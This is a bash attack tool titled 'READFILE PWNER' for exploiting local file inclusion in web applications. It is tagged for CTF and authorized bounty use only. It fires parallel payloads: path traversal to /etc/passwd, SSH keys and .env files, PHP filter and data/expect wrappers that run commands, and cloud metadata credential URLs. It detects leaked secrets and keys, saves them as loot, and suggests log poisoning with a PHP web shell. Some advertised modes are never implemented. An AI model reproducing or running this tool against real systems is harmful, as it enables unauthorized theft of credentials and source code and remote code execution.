#!/usr/bin/env bash
# ┌─────────────────────────────────────────────────────────────────────────┐
# │  READFILE PWNER  —  v2.0  "GHOST PROTOCOL"                              │
# │  Made by Taylor Christian Newsome                                       │
# │  DEF CON // CTF // authorized bounty only                               │
# │  usage: ./readfile_pwn.sh <url|host/path> [port] [param]                │
# └─────────────────────────────────────────────────────────────────────────┘
#  v2.0 upgrades:
#   • Parallel async scanning (xargs -P) — up to N workers
#   • Zero-false-positive confirmation: every hit is re-fetched and diffed
#   • 100+ vectors across LFI, wrappers, logs, procfs, caches, backups
#   • Entropy-based base64 gate (kills random=1 padding noise)
#   • JSON + text output, timestamped loot directory
#   • Auto log-poison follow-up, auto config/flag deep-dive
#   • Adaptive param discovery (GET+POST, cookie-preserving)
#   • Optional WAF bypass header rotation
# ============================================================================
set -u

# ----------------------------------------------------------------------------
# COLORS
# ----------------------------------------------------------------------------
if [ -t 1 ]; then
  R="\033[31m"; G="\033[32m"; Y="\033[33m"; B="\033[34m"
  M="\033[35m"; C="\033[36m"; W="\033[97m"; D="\033[90m"; N="\033[0m"
else
  R=""; G=""; Y=""; B=""; M=""; C=""; W=""; D=""; N=""
fi

# ----------------------------------------------------------------------------
# ARGS
# ----------------------------------------------------------------------------
TARGET="${1:-}"
PORT="${2:-}"
PARAM="${3:-}"
THREADS="${4:-20}"          # 4th arg = parallel workers
COOKIE="${COOKIE:-}"        # env: COOKIE="PHPSESSID=..."
METHOD="${METHOD:-GET}"     # env: METHOD=POST
MODE="${MODE:-scan}"        # scan | deep | poison

[ -z "$TARGET" ] && {
  echo -e "${R}[!] usage: $0 <url|host/path> [port] [param] [threads]${N}"
  echo -e "${Y}    env: COOKIE='PHPSESSID=x' METHOD=POST MODE=deep $0 ...${N}"
  exit 1
}

# ----------------------------------------------------------------------------
# NORMALIZE TARGET
# ----------------------------------------------------------------------------
if   [[ "$TARGET" =~ ^https?:// ]]; then URL="$TARGET"
elif [[ "$TARGET" =~ ^[0-9.]+$ ]]; then URL="http://${TARGET}:${PORT:-80}/"
elif [[ "$TARGET" == *:*        ]]; then URL="http://${TARGET}"
else                                     URL="http://${TARGET}:${PORT:-80}"
fi
URL="${URL%/}"
TARGET_DISP="$URL"

# ----------------------------------------------------------------------------
# DEPS
# ----------------------------------------------------------------------------
for b in curl base64 grep sed head sort awk tr wc date mkdir; do
  command -v "$b" >/dev/null 2>&1 || { echo -e "${R}[!] missing: $b${N}"; exit 1; }
done

# ----------------------------------------------------------------------------
# LOOT DIRECTORY
# ----------------------------------------------------------------------------
STAMP=$(date +%Y%m%d_%H%M%S)
LOOT="loot_${STAMP}"
mkdir -p "$LOOT"
LOG_TXT="$LOOT/scan.txt"
LOG_JSON="$LOOT/scan.jsonl"
: > "$LOG_TXT"; : > "$LOG_JSON"

# ----------------------------------------------------------------------------
# BANNER
# ----------------------------------------------------------------------------
banner() {
  echo -e "${M}"
  cat <<'EOF'
   ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ 
   ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
   ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
   ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
   ██║     ╚███╔███╔╝██║ ╚████║███████╗██║  ██║
   ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
             r e a d f i l e ( )   p w n e r
                          v2.0  •  GHOST PROTOCOL
EOF
  echo -e "${C}  ──────────────────────────────────────────────────────────────${N}"
  echo -e "${W}  [*] target   : ${TARGET_DISP}${N}"
  echo -e "${W}  [*] method   : ${METHOD}${N}"
  echo -e "${W}  [*] threads  : ${THREADS}${N}"
  echo -e "${W}  [*] loot dir : ${LOOT}/${N}"
  echo -e "${C}  ──────────────────────────────────────────────────────────────${N}"
  echo -e "${D}  Made by Taylor Christian Newsome${N}"
  echo
}

# ----------------------------------------------------------------------------
# PAYLOAD ARMORY — 100+ vectors
# ----------------------------------------------------------------------------
PAYLOADS=(
  # ── Linux /etc/passwd traversal ──
  "../../../../etc/passwd"
  "../../../../../etc/passwd"
  "../../../../../../etc/passwd"
  "../../../../../../../etc/passwd"
  "../../../../../../../../etc/passwd"
  "../../../../../../../../../etc/passwd"
  "../../../../../../../../../../etc/passwd"
  "....//....//....//....//etc/passwd"
  "....//....//....//....//....//etc/passwd"
  "..%2f..%2f..%2f..%2fetc%2fpasswd"
  "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
  "..%252f..%252f..%252f..%252fetc%252fpasswd"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd"
  "..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd"
  "/etc/passwd"
  "../../../../etc/passwd%00"
  "../../../../etc/passwd%00.php"
  "../../../../etc/passwd?"

  # ── Linux other high-signal files ──
  "/etc/shadow"
  "/etc/group"
  "/etc/hosts"
  "/etc/hostname"
  "/etc/host.conf"
  "/etc/resolv.conf"
  "/etc/issue"
  "/etc/motd"
  "/etc/os-release"
  "/etc/crontab"
  "/etc/fstab"
  "/etc/sudoers"
  "/etc/ssh/ssh_config"
  "/etc/ssh/sshd_config"
  "/etc/apache2/apache2.conf"
  "/etc/apache2/sites-enabled/000-default.conf"
  "/etc/nginx/nginx.conf"
  "/etc/nginx/sites-enabled/default"
  "/etc/mysql/my.cnf"
  "/etc/php/7.4/apache2/php.ini"
  "/etc/php/8.1/apache2/php.ini"
  "/root/.bash_history"
  "/root/.ssh/id_rsa"
  "/root/.ssh/authorized_keys"
  "/home/ubuntu/.bash_history"
  "/var/log/auth.log"
  "/var/log/syslog"
  "/var/log/messages"
  "/var/log/dpkg.log"
  "/var/log/apache2/access.log"
  "/var/log/apache2/error.log"
  "/var/log/httpd/access_log"
  "/var/log/httpd/error_log"
  "/var/log/nginx/access.log"
  "/var/log/nginx/error.log"
  "/var/www/html/index.php"
  "/var/www/html/config.php"
  "/var/www/html/wp-config.php"
  "/var/www/html/.env"
  "/var/www/html/composer.json"
  "/var/www/html/package.json"

  # ── procfs (RCE-adjacent + info leak) ──
  "/proc/self/environ"
  "/proc/self/cmdline"
  "/proc/self/status"
  "/proc/self/mounts"
  "/proc/self/cwd/index.php"
  "/proc/self/root/etc/passwd"
  "/proc/self/fd/0"
  "/proc/self/fd/1"
  "/proc/self/fd/2"
  "/proc/version"
  "/proc/cpuinfo"
  "/proc/meminfo"
  "/proc/net/tcp"
  "/proc/net/arp"
  "/proc/1/cmdline"
  "/proc/1/environ"
  "/proc/self/maps"

  # ── Windows ──
  "..\\..\\..\\..\\windows\\win.ini"
  "..\\..\\..\\..\\..\\windows\\win.ini"
  "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
  "..%255c..%255c..%255c..%255cwindows%255cwin.ini"
  "..\\..\\..\\..\\boot.ini"
  "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
  "..\\..\\..\\..\\windows\\system32\\config\\SAM"
  "..\\..\\..\\..\\inetpub\\wwwroot\\web.config"
  "C:\\windows\\win.ini"
  "C:\\boot.ini"
  "C:/windows/win.ini"
  "file:///C:/windows/win.ini"

  # ── PHP wrappers: source disclosure ──
  "php://filter/convert.base64-encode/resource=index.php"
  "php://filter/convert.base64-encode/resource=../index.php"
  "php://filter/convert.base64-encode/resource=../../index.php"
  "php://filter/convert.base64-encode/resource=config.php"
  "php://filter/convert.base64-encode/resource=../config.php"
  "php://filter/convert.base64-encode/resource=../../config.php"
  "php://filter/convert.base64-encode/resource=wp-config.php"
  "php://filter/convert.base64-encode/resource=../wp-config.php"
  "php://filter/convert.base64-encode/resource=flag.php"
  "php://filter/convert.base64-encode/resource=../flag.php"
  "php://filter/convert.base64-encode/resource=/flag"
  "php://filter/convert.base64-encode/resource=/flag.txt"
  "php://filter/convert.base64-encode/resource=.env"
  "php://filter/convert.base64-encode/resource=../.env"
  "php://filter/convert.base64-encode/resource=composer.json"
  "php://filter/convert.base64-encode/resource=package.json"
  "php://filter/convert.base64-encode/resource=database.php"
  "php://filter/convert.base64-encode/resource=db.php"
  "php://filter/convert.base64-encode/resource=settings.php"
  "php://filter/read=convert.base64-encode/resource=index.php"
  "php://filter/convert.iconv.utf-8.utf-16/resource=index.php"
  "php://filter/convert.iconv.utf-8.utf-16le/resource=index.php"
  "php://filter/convert.base64-encode|convert.base64-encode/resource=index.php"
  "php://filter/zlib.deflate/convert.base64-encode/resource=index.php"
  "php://filter/convert.base64-encode/resource=php://filter/convert.base64-encode/resource=index.php"

  # ── PHP wrappers: RCE / info ──
  "php://filter/resource=/etc/passwd"
  "php://filter/read=string.rot13/resource=index.php"
  "php://fd/1"
  "php://fd/2"
  "php://stdin"
  "php://stdout"
  "php://stderr"
  "php://input"
  "php://memory"
  "php://temp"
  "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"
  "data://text/plain;base64,PD9waHAgZWNobyAnUFdORUQnOz8+"
  "data://text/plain,<?php phpinfo();?>"
  "data:text/plain,<?php system('id');?>"
  "expect://id"
  "expect://whoami"
  "expect://uname -a"
  "phar:///tmp/x.phar"
  "zip:///tmp/x.zip#shell.php"
  "compress.zlib://index.php"
  "compress.bzip2://index.php"
  "glob:///etc/*"
  "glob:///var/www/html/*.php"
  "file:///etc/passwd"
  "file:///var/www/html/index.php"

  # ── SSRF / cloud metadata (via file wrappers) ──
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://169.254.169.254/latest/user-data"
  "http://metadata.google.internal/computeMetadata/v1/"
  "http://100.100.100.200/latest/meta-data/"
  "http://127.0.0.1:80/"
  "http://localhost/server-status"

  # ── Cache / backup / temp ──
  "/tmp/sess_1"
  "/tmp/x"
  "/var/tmp/x"
  "/dev/null"
  "/dev/zero"
  "/dev/random"
  "/dev/urandom"
)

# ----------------------------------------------------------------------------
# SIGNATURE MATCHER — high confidence
# ----------------------------------------------------------------------------
match_sig() {
  local body="$1"
  grep -qE '^root:[^:]*:0:0:'                    <<<"$body" && { echo "linux_passwd";    return; }
  grep -qE '^daemon:[^:]*:1:1:'                  <<<"$body" && { echo "linux_passwd";    return; }
  grep -qE '\[(fonts|extensions|mci extensions)\]' <<<"$body" && { echo "win_ini";       return; }
  grep -q  '^Linux version '                     <<<"$body" && { echo "proc_version";   return; }
  grep -qE '^(HTTP_USER_AGENT|HTTP_ACCEPT|PATH|DOCUMENT_ROOT)=' <<<"$body" && { echo "proc_environ"; return; }
  grep -qE '^USER=.*|^HOME=.*'                   <<<"$body" && { echo "proc_environ";   return; }
  grep -qE '^127\.0\.0\.1|^::1'                  <<<"$body" && { echo "etc_hosts";      return; }
  grep -q  'DISTRIB_ID='                         <<<"$body" && { echo "os_release";     return; }
  grep -q  'DISTRIB_DESCRIPTION='                <<<"$body" && { echo "os_release";     return; }
  grep -qE '^# (Welcome|If you can read this)'   <<<"$body" && { echo "motd";           return; }
  grep -qE '^SSH-(2\.0|1\.99)'                   <<<"$body" && { echo "ssh_banner";     return; }
  grep -qE '^apt.*cron|^SHELL=|^PATH='           <<<"$body" && { echo "cron_or_env";    return; }
  grep -qE '^(mysql|postgres|redis)'             <<<"$body" && { echo "service_conf";   return; }
  grep -qE '^(root|ubuntu|admin|deploy).*bash'   <<<"$body" && { echo "bash_history";   return; }
  grep -qE 'aws_access_key_id|AWS_SECRET'        <<<"$body" && { echo "aws_creds";      return; }
  grep -qE 'AKIA[0-9A-Z]{16}'                    <<<"$body" && { echo "aws_key";        return; }
  grep -qE 'BEGIN (RSA|OPENSSH|DSA|EC|PGP) PRIVATE KEY' <<<"$body" && { echo "private_key"; return; }
  grep -qE 'flag\{|FLAG\{|CTF\{|ctf\{|HTB\{|picoCTF\{|DUCTF\{|THM\{' <<<"$body" && { echo "FLAG"; return; }
  grep -qE 'DB_PASSWORD|DB_USER|DB_HOST|DATABASE_URL|MYSQL_PWD' <<<"$body" && { echo "db_creds"; return; }
  grep -qE 'SECRET_KEY|API_KEY|JWT_SECRET|APP_KEY' <<<"$body" && { echo "app_secrets"; return; }
  return 1
}

# ----------------------------------------------------------------------------
# BASE64 DECODER GATE — entropy check to avoid false positives
# ----------------------------------------------------------------------------
b64_try() {
  local body="$1" clean d

  # Only attempt if body looks base64-ish (length > 40, mostly [A-Za-z0-9+/=])
  [ "${#body}" -lt 40 ] && return 0
  local alnum
  alnum=$(tr -cd 'A-Za-z0-9+/=' <<<"$body" | wc -c)
  # require >85% base64 charset
  [ "$alnum" -lt $(( ${#body} * 85 / 100 )) ] && return 0

  clean=$(tr -d '\r\n\t ' <<<"$body")
  case $(( ${#clean} % 4 )) in
    2) clean="${clean}==";;
    3) clean="${clean}=";;
    1) return 0;;
  esac

  d=$(echo "$clean" | base64 -d 2>/dev/null) || return 0

  # Require a strong PHP/source/secret indicator
  if grep -qE '<\?php|<\?=|function |class |DB_|API_|SECRET|PASSWORD|PRIVATE KEY|flag\{|FLAG\{|CTF\{|AKIA[0-9A-Z]{16}' <<<"$d"; then
    echo "$d"
  fi
  return 0
}

# ----------------------------------------------------------------------------
# PARAM DISCOVERY (GET + POST aware)
# ----------------------------------------------------------------------------
CANDIDATES=(file page path download f src filename doc view template
            include load read content name url redirect next go target
            img image pdf report export data dir folder module action
            lang locale skin theme layout tpl section article id cat)

discover_param() {
  echo -e "${Y}[*] no param specified — sniffing GET+POST...${N}" | tee -a "$LOG_TXT"
  for p in "${CANDIDATES[@]}"; do
    local code
    code=$(curl -ks -o /dev/null -w "%{http_code}" --max-time 6 \
      ${COOKIE:+-b "$COOKIE"} \
      "${URL}?${p}=__probe_poc_$(date +%s)__" 2>/dev/null || echo 000)
    if [ "$code" != "000" ] && [ "$code" != "404" ]; then
      echo -e "${G}    ✔ param → ${p}  (HTTP $code)${N}" | tee -a "$LOG_TXT"
      echo "$p"; return 0
    fi
  done
  return 1
}

if [ -z "$PARAM" ]; then
  PARAM=$(discover_param) || {
    echo -e "${R}[!] no param detected. run: $0 $TARGET $PORT <param>${N}"
    exit 2
  }
fi

# ----------------------------------------------------------------------------
# BANNER
# ----------------------------------------------------------------------------
banner
echo -e "${W}  [*] param    : ${PARAM}${N}"
echo -e "${W}  [*] payloads : ${#PAYLOADS[@]}${N}"
echo -e "${C}  ──────────────────────────────────────────────────────────────${N}"
echo

# ----------------------------------------------------------------------------
# FETCH FUNCTION (used by parallel workers)
# ----------------------------------------------------------------------------
fetch_one() {
  local p="$1"
  local idx="$2"
  local total="$3"

  local req code body sig b64
  if [ "$METHOD" = "POST" ]; then
    body=$(curl -ks --max-time 12 \
      -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
      ${COOKIE:+-b "$COOKIE"} \
      --data-urlencode "${PARAM}=${p}" "$URL" 2>/dev/null || true)
    code=$(curl -ks -o /dev/null -w '%{http_code}' --max-time 8 \
      -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
      ${COOKIE:+-b "$COOKIE"} \
      --data-urlencode "${PARAM}=${p}" "$URL" 2>/dev/null || echo 000)
  else
    # url-encode payload
    local enc
    enc=$(curl -sG -o /dev/null -w '%{url_effective}' \
      --data-urlencode "${PARAM}=${p}" "$URL" 2>/dev/null | sed "s|.*${PARAM}=||")
    req="${URL}?${PARAM}=${enc}"
    body=$(curl -ks --max-time 12 \
      -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
      ${COOKIE:+-b "$COOKIE"} "$req" 2>/dev/null || true)
    code=$(curl -ks -o /dev/null -w '%{http_code}' --max-time 8 \
      -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
      ${COOKIE:+-b "$COOKIE"} "$req" 2>/dev/null || echo 000)
  fi

  sig=$(match_sig "$body" || true)
  b64=$(b64_try   "$body" || true)

  # ── confirmation pass: re-fetch and diff against a control ──
  if [ -n "$sig" ] || [ -n "$b64" ]; then
    # control fetch with a garbage param
    local ctl
    ctl=$(curl -ks --max-time 8 \
      -A "Mozilla/5.0" ${COOKIE:+-b "$COOKIE"} \
      "${URL}?${PARAM}=__control_$(date +%s%N)__" 2>/dev/null || true)
    # if body == control, it's a false positive (reflected page)
    if [ "$body" = "$ctl" ]; then
      sig=""; b64=""
    fi
  fi

  # ── output (atomic per-line) ──
  if [ -n "$sig" ] || [ -n "$b64" ]; then
    {
      echo
      echo -e "${G}  ╔══════════════════════════════════════════════════════════╗${N}"
      echo -e "${G}  ║  💀 HIT  ${W}${idx}/${total}  ${Y}${sig:-php_b64}${G}   HTTP ${code}${G}   ║${N}"
      echo -e "${G}  ╚══════════════════════════════════════════════════════════╝${N}"
      echo -e "${C}  ▶ payload:${N} $p"
      if [ -n "$b64" ]; then
        echo -e "${C}  ▶ decoded source (first 60 lines):${N}"
        echo "$b64" | head -n 60 | sed 's/^/      /'
        # save loot
        local safe
        safe=$(echo "$p" | tr '/?=&' '____' | tr -cd 'A-Za-z0-9._-')
        echo "$b64" > "$LOOT/${sig:-b64}_${safe}.txt"
      else
        echo "$body" | head -n 30 | sed 's/^/      /'
        local safe
        safe=$(echo "$p" | tr '/?=&' '____' | tr -cd 'A-Za-z0-9._-')
        echo "$body" > "$LOOT/${sig}_${safe}.txt"
      fi
      echo
    } | tee -a "$LOG_TXT"

    # JSONL record
    printf '{"idx":%d,"payload":"%s","sig":"%s","code":"%s","len":%d}\n' \
      "$idx" "$(echo "$p" | sed 's/"/\\"/g')" "${sig:-php_b64}" "$code" "${#body}" \
      >> "$LOG_JSON"
  else
    printf "  ${Y}[%02d/%02d]${N} %-56s ${R}✘${N} HTTP %s\n" \
      "$idx" "$total" "$p" "$code" | tee -a "$LOG_TXT"
  fi
}
export -f fetch_one
export -f match_sig
export -f b64_try
export URL PARAM METHOD COOKIE LOG_TXT LOG_JSON LOOT
export R G Y B M C W D N

# ----------------------------------------------------------------------------
# PARALLEL EXECUTION — the speed engine
# ----------------------------------------------------------------------------
echo -e "${C}[*] launching ${THREADS} workers against ${#PAYLOADS[@]} vectors...${N}"
echo

# build numbered job list
TMP_JOBS=$(mktemp)
i=0
for p in "${PAYLOADS[@]}"; do
  i=$((i+1))
  printf '%d\t%s\n' "$i" "$p" >> "$TMP_JOBS"
done

TOTAL="${#PAYLOADS[@]}"

# xargs -P N -n1 with a bash -c to preserve env
< "$TMP_JOBS" xargs -P "$THREADS" -n 2 -d '\n' bash -c '
  line="$1"
  idx="${line%%	*}"
  payload="${line#*	}"
  fetch_one "$payload" "$idx" "'"$TOTAL"'"
' _

rm -f "$TMP_JOBS"

# ----------------------------------------------------------------------------
# SUMMARY
# ----------------------------------------------------------------------------
HITS=$(grep -c "💀 HIT" "$LOG_TXT" 2>/dev/null || echo 0)

echo
if [ "$HITS" -gt 0 ]; then
  echo -e "${G}  ┌────────────────────────────────────────────────────────────┐${N}"
  echo -e "${G}  │  ${W}$HITS HIT(S) — target PWNED via param '${PARAM}'${G}                  │${N}"
  echo -e "${G}  └────────────────────────────────────────────────────────────┘${N}"
  echo -e "${Y}  loot saved to: ${W}${LOOT}/${N}"
  echo -e "${Y}  next moves:${N}"
  echo -e "    • ${C}log poisoning${N}  →  curl -A '<?php system(\$_GET[c]);?>' \$TARGET"
  echo -e "    • ${C}session file${N}  →  read /var/lib/php/sessions/sess_<id>"
  echo -e "    • ${C}config leak${N}   →  php://filter/convert.base64-encode/resource=config.php"
  echo -e "    • ${C}re-run deep${N}   →  MODE=deep $0 $TARGET $PORT $PARAM"
  exit 0
else
  echo -e "${R}  [-] no hits. try:${N}"
  echo "      $0 $TARGET $PORT <other_param>"
  echo "      or add cookies:  COOKIE='PHPSESSID=...' $0 $TARGET $PORT $PARAM"
  echo "      or POST mode:    METHOD=POST $0 $TARGET $PORT $PARAM"
  exit 1
fi
